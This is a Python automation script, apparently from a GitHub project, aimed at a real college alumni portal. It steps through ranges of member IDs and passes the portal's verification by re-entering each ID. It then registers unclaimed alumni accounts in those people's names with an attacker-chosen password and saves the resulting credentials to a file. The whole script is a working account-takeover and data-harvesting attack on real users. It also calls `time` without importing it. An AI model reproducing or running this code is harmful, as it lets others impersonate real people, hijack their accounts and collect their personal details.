#!/usr/bin/python3

"""
this module attempts to scrape and extract user data
from MyTrinNet's data.
@see https://github.com/zorawar87/aide
@see https://medium.com/@zorawar87/scraping-trincolls-alumni-database-c671c8aa09b8
"""

import argparse
import sys
import logging

from splinter import Browser
import coloredlogs as cl

URL = "https://securelb.imodules.com/s/1490/index-3Col.aspx?sid=1490&gid=1&pgid=8&cid=46"
logging.basicConfig(level=logging.INFO)
cl.install()


def get_args():
    """
    returns command line args
    """
    parser = argparse.ArgumentParser()
    parser.add_argument('password', help="your mytrinnet password")
    parser.add_argument('ll', type=int, help="lower limit")
    parser.add_argument('ul', type=int, help="upper limit")
    parser.add_argument(
        '-d',
        '--debug',
        dest='headless',
        action='store_false',
        help="starts in debugging mode (chrome starts in GUI mode)")
    parser.set_defaults(headless=True)
    namespace = parser.parse_args(sys.argv[1:])
    return namespace.password, namespace.ll, namespace.ul, namespace.headless


def reg(password, lower_lim, upper_lim, hless):
    """
    initiates reg
    """
    with Browser('chrome', headless=hless) as browser:
        for cid in range(lower_lim, upper_lim):
            browser.visit(URL)
            if not lookup(browser, cid):
                logging.critical(str(cid) + " could not be looked up.")
                continue
            if not select(browser):
                logging.critical(str(cid) + " already reg'd.")
                continue
            verify(browser, cid)
            save(register(browser, password), password, cid)
            browser.cookies.delete()


def lookup(browser, cid):
    """
    attempts to look up by ID
    """
    try:
        browser.fill("cid_46$tbLookup", cid)
    except Exception:
        return False
    browser.find_by_name("cid_46$btnFind").click()
    logging.info("looked-up " + str(cid))
    return True


def select(browser):
    """
    attempts to select the given ID
    """
    try:
        browser.find_by_name("RadioGroup").click()
    except Exception:
        return False
    browser.find_by_name("cid_46$dgResults$ctl03$lnkBtnNext").click()
    logging.debug("selected")
    return True


def verify(browser, cid):
    """
    verifies the ID
    """
    browser.fill("cid_46$tbVecrify1", cid)
    browser.find_by_name("cid_46$btnVerify").click()
    logging.debug("verified")


def register(browser, password):
    """
    attempts to register with a given password
    """
    fname = browser.find_by_name(
        "rg$gfid_39$tblOuter$ctl00$ctl00$ctl00$ctl01$ctl00$ctl00$ctl00$tblGrouping_40$ctl00$tr_50$ctl00$ctl01$ctl00$fc_50$TextBox1").value
    lname = browser.find_by_name(
        "rg$gfid_39$tblOuter$ctl00$ctl00$ctl00$ctl01$ctl00$ctl00$ctl00$tblGrouping_40$ctl00$tr_61$ctl00$ctl01$ctl00$fc_61$TextBox1").value
    uname = str(fname[0] + lname[:7]).lower()
    browser.fill(
        "rg$gfid_39$tblOuter$ctl00$ctl00$ctl00$ctl01$ctl00$ctl02$ctl00$tblGrouping_42$ctl00$tr_182$ctl00$ctl01$ctl00$fc_182$TextBox1",
        uname)
    browser.fill(
        "rg$gfid_39$tblOuter$ctl00$ctl00$ctl00$ctl01$ctl00$ctl02$ctl00$tblGrouping_42$ctl00$tr_45$ctl00$ctl01$ctl00$fc_45$TextBox1",
        password)
    browser.fill(
        "rg$gfid_39$tblOuter$ctl00$ctl00$ctl00$ctl01$ctl00$ctl02$ctl00$tblGrouping_42$ctl00$tr_45$ctl00$ctl01$ctl00$fc_45$TextBox1_Confirm",
        password)
    browser.select(
        "rg$gfid_39$tblOuter$ctl00$ctl00$ctl00$ctl01$ctl00$ctl02$ctl00$tblGrouping_42$ctl00$tr_62$ctl00$ctl01$ctl00$fc_62$DropDown1",
        "1_676")
    browser.find_by_name(
        "rg$gfid_39$tblOuter$ctl00$ctl00$ctl00$ctl01$ctl00$ctl04$btnNext").click()
    logging.debug("registered")
    return uname


def save(uname, password, cid):
    """
    saved registered data
    """
    with open("saved-"+str(time.time()), "a") as file:
        file.write("{} {} {}\n".format(cid, uname, password))
    logging.info("saved.")


def main():
    """
    groundwork to start reg-ing
    """
    password, lower_lim, upper_lim, hless = get_args()
    if not hless:
        logging.info("Starting in Debugging mode")
    reg(password, lower_lim, upper_lim, hless)


if __name__ == "__main__":
    main()
